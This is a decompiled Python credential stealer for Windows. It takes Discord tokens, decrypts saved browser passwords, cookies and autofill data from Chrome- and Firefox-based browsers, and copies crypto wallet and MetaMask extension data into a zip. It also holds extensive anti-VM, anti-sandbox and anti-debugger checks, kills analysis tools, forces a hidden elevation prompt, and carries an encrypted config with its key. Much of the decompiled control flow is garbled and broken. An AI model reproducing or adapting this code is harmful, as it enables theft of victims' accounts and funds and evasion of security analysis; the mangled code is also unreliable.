# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: output.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from hashlib import pbkdf2_hmac, sha1
global login_counts_for_each_site  # inserted
global options  # inserted
global other_pwds_count  # inserted
global modules  # inserted
import hmac
import platform
import os
import re
import json
import base64
import shutil
import sqlite3
import string
import subprocess
import socket
import io
import random
import multiprocessing
from PIL import Image
import struct
import datetime
import threading
from time import sleep
import uuid
import winreg
import zipfile
import zlib
import cv2
import psutil
import pyperclip
import requests
from urllib3 import PoolManager
from win32gui import EnumWindows, GetWindowText, MessageBox, DeleteObject, GetDesktopWindow, GetWindowDC
import win32api
import win32con
import win32ui
import ctypes
import glob
import sys
from typing import Any, Dict, List, Tuple
from Cryptodome.Cipher import AES, DES3
from Cryptodome.Util.Padding import unpad
from win32crypt import CryptUnprotectData
from pathlib import Path
from pyasn1.codec.der.decoder import decode as der_decode
import tzlocal
fn = uuid.uuid4().hex + '.zip'
options = {}
modules = {}
enc_json = 'CfHuMmHybSWHj2gdVNJyHil7evYzEuMK83A2mNbaIdniemq66txoK6kmhCQtBcyramqas++QGDdZCUarpynm0CpE+ZftQIiYuWbUHrzJvdHHRHVjr5r+pR8yCyYhV1YxbWaGjYekqMSfkfjzGqkZ1j24HcP5V9kmIBI6R6COiTtKLiHqi2l5eV6W6gDfQWj2GPRYwK6rzCIYLPuC4ricWUOhEv/s1bAlqV/PLsKAIt2BLWOQhRcM+HhuECeTY9oc38uGlONHxZLUJsQ4w+vS9+I8yGFyL9womHUFqRmvnkTz5mcxhCXwuTyisI21DIvQS+E1x9uwqWs8VyY+h/mh0ejQIKVaJ4JDGB1bTlB9SguCedayyy624PXHUU/wqqrLYs2wDDaHXNhpI1JDYTibnR4g1Wa/2u23Mxc8MRkdnFjzvsssyAfqPC74U0VzLzaaCFxSfzYastrfGG+ceWIrTqGNY9gk8Qf2S/RIROuQPCuswI4NYMc62p838znF0syjfJe45xPsmIakZwhK9IUALAl40P4XPKQfK1aLd7polyAmP1sX2F2p0cByS+mVlKSfJWDhgVH7BQZzY4pjZMr8JafIraBYovowfZ2YPcmMUOcEuWiyQ7Qc9flQ6cvV6vyaQVlOXC6/YoKE0CRjkO/RzFvXOcqSA35Zfan0HyqBKRptxFXVMZQ9MQQpyZYQ2Kfmn17OfLRXPU1/u144tM6qKGfV5bpNYaPAqL5KIuv38wEqnpb4FMxB3swHP9H5+6FIk/RJw94A/mWDKoAVneKZu564XO9qRVNgS0oj3Ciwk/WrqFwcaixCvGi+OHGkCKL2FTEjcmbdNV8TDDEplBd3KHE+3bzWsZiYbWLfecdp8EGh0PHXIIbKhskJol0UYP4/iqMPPUMAPPA67OO4heFon+2r//1MN233PXc70ZNgKPA0cbcjXRdSiXcTZex4K0CzUnMwKeq+y83d4s1xC5txQuDNOvaR7gHJkkgD2J6lXW8dwlWfUWtkdIjs94pU+6jrmBP0lTn6SNTota6SnkKoIe1+f0LN6/JR327DfJhwYnzW+mgHGy55JlQWxH7fpI3Ku++dJkQdqX5XDg/CU1QKKbo8o/Zic++dMxUtG3Szq9bdGBKOQ1VWe+T38mUeayyYa/JQhbUnfOlFYiZ8YMimAVq40xDAmjveYALYxFlIwTwqXcy4yziW+HNzxe4IwfXpjFnJug56PgdQonK1I8PNwjC4y3zP9XPM2BdOVjkp3x1k+LdoI5BufsmHTgDAXRSVpJp9IldYq9vVBaJKAMXGjT+5oUNjJQlsbO530LANr5rD2+L8WHOYFUeuMGAae1J/6RApwFY+/zVziw86VoIxuQSqQDyqQOkYjVlf6GVmZnXklxfifU+u72iQBf9Nfl11APS/s525UVPRJ7bdvEZ9+qjAP+gkOqaT02FJOPjGHKauZVVtvKj3wNwbTqio/nmjiOALfG/czydQhFv9f1BHiWdH0PqKnnY3vV3KCmnMsuZvFpzyadyjGg1mErVkdNVHpT9yf6oLG5m+sP+w1kQ1yOHyLSJjzOFjkGPhniVwLsPLilDL73uugmPcGJmSJUzFX84h7zrg/2ntf9HYIRDQOw=='
sys32 = os.path.join(str(os.getenv('SystemRoot')), 'System32')
roaming: str = os.getenv('appdata', '')
local: str = os.getenv('LOCALAPPDATA', '')
temp: str = os.getenv('temp', '')
regexp = '[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
regexp_enc = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'Content-Type': 'application/json', 'Authorization': ''}
ff_based_browser_paths = {'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles'}
ch_based_browser_paths = {'Discord': roaming + '\\discord', 'Discord Canary': roaming + '\\discordcanary', 'Lightcord': roaming + '\\Lightcord', 'Discord PTB': roaming + '\\discordptb', 'Opera': local + '\\Opera Software\\Opera Stable', 'Opera GX': local + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Amigo\\User Data', 'Torch': local + '\\Torch\\User Data', 'Kometa': local + '\\Kometa\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'CentBrowser': local + '\\CentBrowser\\User Data', '7Star': local + '\\7Star\\7Star\\User Data', 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': local + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data', 'Chrome': local + '\\Google\\Chrome\\User Data\\Default', 'Chrome1': local + '\\Google\\Chrome\\User Data\\Profile 1', '\\Google\\Chrome\\User Data\\Profile 2': local + '\\Google\\Chrome\\User Data\\Profile 3', '
urls = ['google.com', 'tiktok.com', 'ebay.com', 'instagram.com', 'facebook.com', 'paypal.com', 'steam.com', 'coinbase.com']
login_counts_for_each_site = {k: 0 for k in urls}
other_pwds_count = 0

def print(*args, **kwargs):
    return

class DiscordTokens:
    @staticmethod
    def search_tks() -> list:
        try:
            tks = []
            tks.extend(DiscordTokens.search_firefox_tks())
            tks.extend(DiscordTokens.search_ch_d__tks())
            return tks
        except Exception as e:
            return tks

    @staticmethod
    def search_firefox_tks() -> list:
        try:
            tks = []
            if os.path.exists(os.path.join(roaming, 'Mozilla\\Firefox\\Profiles')):
                for path, _, files in os.walk(os.path.join(roaming + '\\Mozilla\\Firefox\\Profiles')):
                    for _file in files:
                        if _file.endswith('.sqlite') and [x.strip() for x in open(f'{path}\\{_file}', 'r', errors='ignore').readlines() for token in re.findall(regexp, line) if tks.append(token) == Discord Canary and (not \\discordcanary.Lightcord('\\Lightcord', Discord PTB))] and (not \\discordptb.<mask_25>(\\Opera Software\\Opera Stable, <mask_27>)) and (not \\discordptb.\\Opera Software\\Opera GX Stable(\\Opera Software\\Opera Stable, Amigo)) and (not \\discordptb.\\Amigo\\User Data(\\Opera Software\\Opera Stable, Torch)) and (not \\discordptb.\\Torch\\User Data(\\Opera Software\\Opera Stable, Kometa)) and (not \\discordptb.\\Kometa\\User Data(\\Opera Software\\Opera Stable, Orbitum)) and (not \\discordptb.\\Orbitum\\User Data(\\Opera Software\\Opera Stable, CentBrowser)) and (not \\discordptb.\\CentBrowser\\User Data(\\Opera Software\\Opera Stable, 7Star)) and (not \\discordptb.\\7Star\\7Star\\User Data(\\Opera Software\\Opera Stable, Sputnik)) and (not \\discordptb.\\Sputnik\\Sputnik\\User Data(\\Opera Software\\Opera Stable, <mask_43>)) and (not \\discordptb.\\Vivaldi\\User Data\\Default(\\Opera Software\\Opera Stable, Chrome SxS
        except Exception as e:
            return tks
                    return tks

    @staticmethod
    def search_ch_d__tks() -> List[str]:
        try:
            tks = []
            for name, path in ch_based_browser_paths.copy().items():
                path = os.path.join(path, 'Local Storage', 'leveldb')
                if not os.path.exists(path):
                    continue
                disc = name.replace(' ', '').lower()
                if 'cord' in path:
                    if os.path.exists(roaming + f'\\{disc}\\Local State'):
                        for file_name in os.listdir(path):
                            if file_name[(-3):] not in ['log', 'ldb']:
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines()]:
                                pass  # postinserted
        except Exception as e:
                                for y in re.findall(regexp_enc, line):
                                    token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                                    tks.append(token)
                else:  # inserted
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ['log', 'ldb']:
                            continue
                        return [tks.append(token) for x in open(f'{path}\\{file_name}', errors='ignore').readlines() for line in [x.strip() for x in re.findall(regexp, line)] for token in re.findall(regexp, tks)]
                return tks

def decrypt_val(buff, master_key):
    pass
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)].decode()
        return decrypted_pass
    except Exception:
        return 'Failed to decrypt password'
    except Exception as e:
        return 'Failed to decrypt password' % (None, e)

def get_master_key(path) -> Tuple[Any, Any] | None:
    try:
        if not os.path.exists(path):
            print('Doesnt exist for path {}'.format(path))
            return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            print('No os_crypt in file')
            return
    except Exception as e:
        pass  # postinserted
    else:  # inserted
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
                local_state = json.loads(c)
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:]
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            return None

class FFStealer:
    MAGIC1 = b'\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
    MAGIC2 = (1, 2, 840, 113549, 3, 7)
    MAGIC3 = (1, 2, 840, 113549, 1, 12, 5, 1, 3)

    @staticmethod
    def steal_ff_history() -> List[Dict[str, Any]]:
        try:
            history = []
        except Exception as e:
            pass  # postinserted
        else:  # inserted
            try:
                for profile in os.listdir(os.path.join(roaming, 'Mozilla\\Firefox\\Profiles')):
                    profpath = os.path.join(roaming, 'Mozilla\\Firefox\\Profiles', profile)
                    if os.path.exists(os.path.join(profpath, 'places.sqlite')):
                        tf = shutil.copy2(os.path.join(profpath, 'places.sqlite'), os.path.join(temp, str(uuid.uuid4())))
                        conn = sqlite3.connect(tf)
                        cur = conn.cursor()
                        cur.execute('SELECT url, title, rev_host, visit_count, last_visit_date, hidden FROM moz_places')
                        for r in cur.fetchall():
                            if not r[0] or not r[1] or (not r[2]):
                                continue
                            history.append({'url': r[0], 'title': r[1], 'domain': r[2], 'visit_count': r[3], 'last_visit_date': r[4], 'hidden': r[5]})
                        history.sort(key=lambda h: h['last_visit_date'], reverse=True)
                        cur.close()
                        conn.close()
                        os.remove(tf)
                return history
            except:
                pass
                return []

    @staticmethod
    def steal_browser_info() -> Dict[str, List[Any]]:
        pass
        try:
            passwords = []
            history = FFStealer.steal_ff_history()
            for profile in os.listdir(os.path.join(roaming, 'Mozilla\\Firefox\\Profiles')):
                pass  # postinserted
        except:
            pass  # postinserted
        pass
            else:  # inserted
                try:
                    key = FFStealer.get_ff_key(os.path.join(roaming, 'Mozilla\\Firefox\\Profiles', profile))
                    if not key:
                        continue
                else:  # inserted
                    passwords.extend(FFStealer.steal_ff_logins(os.path.join(roaming, 'Mozilla\\Firefox\\Profiles', profile), key))
                except Exception as e:
                    pass  # postinserted
            else:  # inserted
                return {'history': history, 'login_data': passwords}
                pass
            except Exception as e:
                pass  # postinserted
            return {}

    @staticmethod
    def get_ff_key(directory: str, masterPassword=''):
        try:
            dbfile = os.path.join(directory, 'key4.db')
            if not os.path.exists(dbfile):
                return
            conn = sqlite3.connect(Path(dbfile).as_posix())
            c = conn.cursor()
            c.execute('\n            SELECT item1, item2\n            FROM metadata\n            WHERE id = \'password\';\n        ')
            row = next(c)
            globalSalt, item2 = row
        except Exception as e:
            pass  # postinserted
        else:  # inserted
            try:
                decodedItem2, _ = der_decode(item2)
                encryption_method = '3DES'
                entrySalt = decodedItem2[0][1][0].asOctets()
                cipherT = decodedItem2[1].asOctets()
                clearText = FFStealer.decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)
            except AttributeError:
                pass  # postinserted
            else:  # inserted
                if clearText!= b'password-check\x02\x02':
                    return
                c.execute('\n            SELECT a11, a102\n            FROM nssPrivate\n            WHERE a102 = ?;\n        ', (FFStealer.MAGIC1,))
            else:  # inserted
                try:
                    row = next(c)
                    a11, a102 = row
            except StopIteration:
                else:  # inserted
                    if encryption_method == 'AES':
                        decodedA11 = der_decode(a11)
                        key = FFStealer.decrypt_aes(decodedA11, masterPassword, globalSalt)
                        if key is None:
                            return
                    if encryption_method == '3DES':
                        decodedA11, _ = der_decode(a11)
                        oid = decodedA11[0][0].asTuple()
                        assert oid == FFStealer.MAGIC3, f'The key is encoded with an unknown format {oid}'
                        entrySalt = decodedA11[0][1][0].asOctets()
                        cipherT = decodedA11[1].asOctets()
                        key = FFStealer.decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)
                        if key is None:
                            return
                else:  # inserted
                    return key[:24]
                encryption_method = 'AES'
                decodedItem2 = der_decode(item2)
                clearText = FFStealer.decrypt_aes(decodedItem2, masterPassword, globalSalt)
                if clearText is None:
                    return
                return
                return None

    @staticmethod
    def decrypt_aes(decoded_item, master_password, global_salt) -> bytes | None:
        try:
            entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
            iteration_count = int(decoded_item[0][0][1][0][1][1])
            key_length = int(decoded_item[0][0][1][0][1][2])
            assert key_length == 32
            encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
            key = pbkdf2_hmac('sha256', encoded_password, entry_salt, iteration_count, dklen=key_length)
            init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
            encrypted_value = decoded_item[0][1].asOctets()
            cipher = AES.new(key, AES.MODE_CBC, init_vector)
            return cipher.decrypt(encrypted_value)
        except Exception as e:
            return None

    @staticmethod
    def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
        try:
            hp = sha1(globalSalt + masterPassword.encode()).digest()
            pes = entrySalt + b'\x00' * (20 - len(entrySalt))
            chp = sha1(hp + entrySalt).digest()
            k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
            tk = hmac.new(chp, pes, sha1).digest()
            k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
            k = k1 + k2
            iv = k[(-8):]
            key = k[:24]
            return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)
        except Exception as e:
            return None

    @staticmethod
    def PKCS7unpad(b):
        try:
            return b[:-b[(-1)]]
        except Exception as e:
            return None
        else:  # inserted
            pass

    @staticmethod
    def decodeLoginData(key, data):
        try:
            asn1data, _ = der_decode(base64.b64decode(data))
            assert asn1data[0].asOctets() == FFStealer.MAGIC1
            assert asn1data[1][0].asTuple() == FFStealer.MAGIC2
            iv = asn1data[1][1].asOctets()
            ciphertext = asn1data[2].asOctets()
            des = DES3.new(key, DES3.MODE_CBC, iv)
            unpadded = FFStealer.PKCS7unpad(des.decrypt(ciphertext))
            if unpadded is None:
                return
            return unpadded.decode()
        except Exception as e:
            return None
        else:  # inserted
            pass

    @staticmethod
    def steal_ff_logins(directory: str, key: bytes) -> List[Dict]:
        try:
            with open(os.path.join(directory, 'logins.json'), 'r') as f:
                pass  # postinserted
        except Exception as e:
                data = json.load(f)
                if 'logins' not in data:
                    return []
                else:  # inserted
                    logins = []
                    for r in data['logins']:
                        logins.append({'url': r['hostname'], 'username': FFStealer.decodeLoginData(key, r['encryptedUsername']), 'password': FFStealer.decodeLoginData(key, r['encryptedPassword'])})
                        return logins
                return []

class CHStealer:
    @staticmethod
    def steal_logins(path: str, mkey: Tuple[Any, Any]) -> List[Dict[str, Any]]:
        try:
            _login_data = []
            login_db = os.path.join(path, 'Login Data')
            if not os.path.isfile(login_db):
                print('Nonexistent')
                return []
            tf = shutil.copy2(login_db, os.path.join(temp, str(uuid.uuid4())))
            conn = sqlite3.connect(tf)
            cur = conn.cursor()
            cur.execute('SELECT origin_url, username_value, password_value FROM logins')
            for r in cur.fetchall():
                if not r[0] or not r[1] or (not r[2]):
                    continue
                passwd = decrypt_val(r[2], mkey)
                _login_data.append({'url': r[0], 'username': r[1], 'password': passwd})
            conn.close()
            os.remove(tf)
            return _login_data
        except Exception as e:
            print(e)
            return _login_data

    @staticmethod
    def steal_history(path: str):
        try:
            history = []
            for r, _, fs in os.walk(path):
                for f in fs:
                    if f.lower() == 'history':
                        fp = os.path.join(r, f)
        except Exception as e:
                    else:  # inserted
                        try:
                            tf = shutil.copy2(fp, os.path.join(temp, str(uuid.uuid4())))
                            db = sqlite3.connect(tf)
                            db.text_factory = lambda b: b.decode(errors='ignore')
                            cursor = db.cursor()
                            results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                            for url, tit, vc, lt in results:
                                history.append({'url': url, 'title': tit, 'visit_count': vc, 'last_visit_time': lt})
                            cursor.close()
                            db.close()
                            os.remove(tf)
                        except Exception as e:
                            pass  # postinserted
            else:  # inserted
                history.sort(key=lambda h: h['last_visit_time'], reverse=True)
                return history
                pass
                print(e)

    @staticmethod
    def steal_autofills(path: str):
        try:
            autofills = set()
            for r, _, fs in os.walk(path):
                for f in fs:
                    if f.lower() == 'web data':
                        fp = os.path.join(r, f)
                    finally:  # inserted
                        try:
                            tf = shutil.copy2(fp, os.path.join(temp, str(uuid.uuid4())))
                            db = sqlite3.connect(tf)
                            db.text_factory = lambda b: b.decode(errors='ignore')
                            cursor = db.cursor()
                            results = [x[0] for x in cursor.execute('SELECT value, value FROM autofill').fetchall() for d in results if d]

    @staticmethod
    def steal_cookies(path: str, mkey: Tuple[Any, Any]):
        try:
            cookies = []
            for r, _, fs in os.walk(path):
                for f in fs:
                    if f.lower() == 'cookies':
                        pass  # postinserted
        except Exception as e:
                    else:  # inserted
                        try:
                            fp = os.path.join(r, f)
                            tf = shutil.copy2(fp, os.path.join(temp, str(uuid.uuid4())))
                            conn = sqlite3.connect(tf)
                            conn.text_factory = lambda b: b.decode(errors='ignore')
                            cur = conn.cursor()
                            cur.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                            for h, n, p, c, e in cur.fetchall():
                                c = decrypt_val(c, mkey)
                                if h and n and c:
                                    pass  # postinserted
                        except Exception as e:
                                else:  # inserted
                                    cookies.append({'host_key': h, 'name': n, 'path': p, 'cookie': c, 'expires_utc': e})
                            else:  # inserted
                                cur.close()
                                conn.close()
                                os.remove(tf)
            else:  # inserted
                return cookies
                pass
                break

    @staticmethod
    def steal_browser_info() -> Dict[str, Dict[str, Any]]:
        try:
            history = {}
            login_data = {}
            autofills = {}
            cookies = {}
            for name, path in ch_based_browser_paths.items():
                if os.path.exists(path):
                    print(f'Checking path: {path}')
                    mkey_path = Path(path).parents[0]
                    mkey = get_master_key(f'{mkey_path}\\Local State')
                    if not mkey:
                        print('Failed to get master key')
                        continue
                    login_data.update({name: CHStealer.steal_logins(path, mkey)})
                    history.update({name: CHStealer.steal_history(path)})
                    autofills.update({name: CHStealer.steal_autofills(path)})
                    cookies.update({name: CHStealer.steal_cookies(path, mkey)})
            return {'login_data': login_data, 'history': history, 'autofills': autofills, 'cookies': cookies}
        except Exception as e:
            print(e)
            return {'login_data': {}, 'history': {}, 'autofills': {}, 'cookies': {}}
        else:  # inserted
            pass

class WalletStealer:
    @staticmethod
    def steal_wallets(zipF: zipfile.ZipFile):
        try:
            wallet_path = os.path.join(temp, str(uuid.uuid4()))
            os.makedirs(wallet_path, exist_ok=True)
            wallets = (('Zcash', os.path.join(roaming, 'Zcash')), ('Armory', os.path.join(roaming, 'Armory')), ('Bytecoin', os.path.join(roaming, 'Bytecoin')), ('Jaxx', os.path.join(roaming, 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(roaming, 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(roaming, 'Ethereum', 'keystore')), ('Electrum', os.path.join(roaming, 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(roaming, 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(local, 'Coinomi', 'Coinomi', 'wallets')))
            browser_paths = {'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(local, 'Chromium', 'User Data'), 'Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(local, 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(roaming, 'Opera Software', 'Opera Stable'), 'Opera': os.path.join(local, 'Slimjet', 'User Data'), 'Opera GX': os.path.join(local, 'UR Browser', 'User Data'), 'Vivaldi': os.path.join
            for name, path in wallets:
                if os.path.isdir(path):
                    named_wallet_path = os.path.join(wallet_path, name)
                    os.makedirs(named_wallet_path, exist_ok=True)
        except Exception as e:
                else:  # inserted
                    try:
                        if path!= named_wallet_path:
                            shutil.copytree(path, os.path.join(named_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
                    except Exception:
                        pass  # postinserted
            else:  # inserted
                for name, path in browser_paths.items():
                    if os.path.isdir(path):
                        for root, dirs, _ in os.walk(path):
                            for dir_name in dirs:
                                if dir_name == 'Local Extension Settings':
                                    pass  # postinserted
                                else:  # inserted
                                    local_extensions_settings_dir = os.path.join(root, dir_name)
                                    for ext_dir in ['ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn']:
                                        ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                                        metamask_browser = os.path.join(wallet_path, 'Metamask ({})'.format(name))
                                        named_wallet_path = os.path.join(metamask_browser, ext_dir)
                                        if os.path.isdir(ext_path) and os.listdir(ext_path):
                                            pass  # postinserted
                                        else:  # inserted
                                            try:
                                                shutil.copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
                    except Exception:
                                            else:  # inserted
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                else:  # inserted
                    for root, dirs, files in os.walk(wallet_path):
                        for f in files:
                            zipF.write(os.path.join(root, f), f'wallets/{os.path.basename(root)}/{f}')
                pass
                pass
                print(e)

def c_int():
    pass
    try:
        socket.setdefaulttimeout(10)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(('google.com', 80))
    except socket.error as ex:
        print(ex)
        exit(1)
    except Exception as e:
        print(e)

def c_dbg():
    try:
        if 'pdb' in sys.modules or 'pydevd' in sys.modules or sys.gettrace() is not None:
            exit(1)
    except Exception as e:
        print(e)

def c_kvm():
    try:
        badDrivers = ['balloon.sys', 'netkvm.sys', 'vioinput', 'viofs.sys', 'vioser.sys']
        for d in badDrivers:
            pass  # postinserted
    except Exception as e:
        else:  # inserted
            try:
                files_found = glob.glob(os.path.join(sys32, d))
                if len(files_found) > 0:
                    exit(1)
            except:
                pass
            print(e)

def c_par_qemu():
    try:
        pDrivers = set(['prl_sf', 'prl_tg', 'prl_eth', 'qemu-ga', 'qemuwmi'])
        files = set(os.listdir(sys32))
        if any((d in files for d in pDrivers)):
            exit(1)
    except Exception as e:
        print(e)
    else:  # inserted
        pass

def c_rec_f():
    try:
        recdir = os.path.join(roaming, 'Microsoft', 'Windows', 'Recent')
        files = os.listdir(recdir)
        if len(files) < 20:
            exit(1)
    except Exception as e:
        print(e)

def c_win():
    try:
        graywolf = ['proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor
        EnumWindows(lambda hwnd, _: exit(1) if GetWindowText(hwnd) in blacklistedWinNames else _, None)
    except Exception as e:
        print(e)

def k_proc():
    try:
        badProcs = set(['taskmgr.exe', 'process.exe', 'processhacker.exe', 'ksdumper.exe', 'fiddler.exe', 'httpdebuggerui.exe', 'wireshark.exe', 'httpanalyzerv7.exe', 'fiddler.exe', 'decoder.exe', 'regedit.exe', 'procexp.exe', 'dnspy.exe', 'vboxservice.exe', 'burpsuit.exe', 'DbgX.Shell.exe', 'ILSpy.exe', 'ollydbg.exe', 'x32dbg.exe', 'x64dbg.exe', 'gdb.exe', 'idaq.exe', 'idag.exe', 'idaw.exe', 'ida64.exe', 'idag64.exe', 'idaw64.exe', 'idaq64.exe', 'windbg.exe', 'ollydbg.exe', 'immunitydebugger.exe', 'windasm.exe', 'vboxservices.exe', 'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe', 'VMSrvc.exe', 'vemusrvc.exe', 'VMUSrvc.exe', 'qemu-ga.exe', 'prl_cc.exe', 'prl_tools.exe', 'vmtoolsd.exe', 'df5serv.exe'])
        for proc in badProcs:
            subprocess.run(['taskkill', '/f', '/im', proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(e)

def d_check():
    try:
        disks = subprocess.check_output('wmic logicaldisk get name', shell=True).decode('utf-8')
        if 'DADY HARDDISK' in disks or 'QEMU HARDDISK' in disks:
            exit(1)
    except Exception as e:
        print(e)

def c_uname():
    try:
        names = ['Johnson', 'Miller', 'malware', 'maltest', 'CurrentUser', 'Sandbox', 'virus', 'John Doe', 'test user', 'sand box', 'WDAGUtilityAccount']
        uname = os.getenv('USERNAME')
        if uname in names:
            exit(1)
    except Exception as e:
        print(e)
    else:  # inserted
        pass

def c_hostname():
    try:
        blacklisted_pc_names = ['JONH-PC', 'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS']
        hostname = os.environ['COMPUTERNAME']
        if set(blacklisted_pc_names) & set(hostname):
            exit(1)
    except Exception as e:
        print(e)

def vm_artifacts():
    try:
        badfiles = ['VBoxMouse.sys', 'VBoxGuest.sys', 'VBoxSF.sys', 'VBoxVideo.sys', 'vmmouse.sys', 'vboxogl.dll', 'VBoxMouse.sys', 'VBoxGuest.sys', 'VBoxSF.sys', 'VBoxVideo.sys', 'vboxdisp.dll', 'vboxhook.dll', 'vboxmrxnp.dll', 'vboxogl.dll', 'vboxoglarrayspu.dll', 'vboxoglcrutil.dll', 'vboxoglerrorspu.dll', 'vboxoglfeedbackspu.dll', 'vboxoglpackspu.dll', 'vboxoglpassthroughspu.dll', 'vboxservice.exe', 'vboxtray.exe', 'VBoxControl.exe', 'vmmouse.sys', 'vmhgfs.sys', 'vmusbmouse.sys', 'vmkdb.sys', 'vmrawdsk.sys', 'vmmemctl.sys', 'vm3dmp.sys', 'vmci.sys', 'vmsci.sys', 'vmx_svga.sys']
        baddirs = ['C:\\Program Files\\oracle\\virtualbox guest additions']
        files = glob.glob(os.path.join(sys32, '*'))
        files = set((os.path.basename(f).lower() for f in files))
        badfiles = set(badfiles)
        baddirs = set(baddirs)
        if any((f in badfiles for f in files)):
            exit(1)
        if any((os.path.exists(d) for d in baddirs)):
            exit(1)
    except Exception as e:
        print(e)
    else:  # inserted
        pass

def det_vm():
    try:
        wmicres = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode('utf-8')
        if 'wmvare' in wmicres.lower() or 'virtualbox' in wmicres.lower():
            exit(1)
    except Exception as e:
        print(e)
    else:  # inserted
        pass

def c_time():
    pass
    return None

def c_cpu():
    try:
        if multiprocessing.cpu_count() < 1:
            exit(1)
    except Exception as e:
        print(e)

def g_uac():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return
        if options['repeat_uac']['enabled']:
            pass
    except Exception as e:
            else:  # inserted
                try:
                    subprocess.run(f'powershell -Command Start-Process \"powershell\" -WindowStyle Hidden -Verb runAs -Args {sys.executable}', shell=True, stdout=subprocess.DEVNULL).check_returncode()
            except subprocess.CalledProcessError:
                else:  # inserted
                    exit(0)
        subprocess.run(f'powershell -Command Start-Process \"powershell\" -WindowStyle Hidden -Verb runAs -Args {sys.executable}', shell=True, stdout=subprocess.DEVNULL).check_returncode()
        exit(0)
                pass
                print(e)
            else:  # inserted
                pass

def decrypt_config_val(data, key):
    try:
        decoded = base64.b64decode(data)
        iv = decoded[:16]
        cipher = AES.new(key.encode(), AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(decoded[16:]), 16).decode()
    except Exception as e:
        print(e)
        return None
    else:  # inserted
        pass

def decrypt_config():
    global modules  # inserted
    global options  # inserted
    try:
        decrypted = decrypt_config_val(enc_json, '2bcc0d2cc9aa2cb52bcd535beb7b6976')
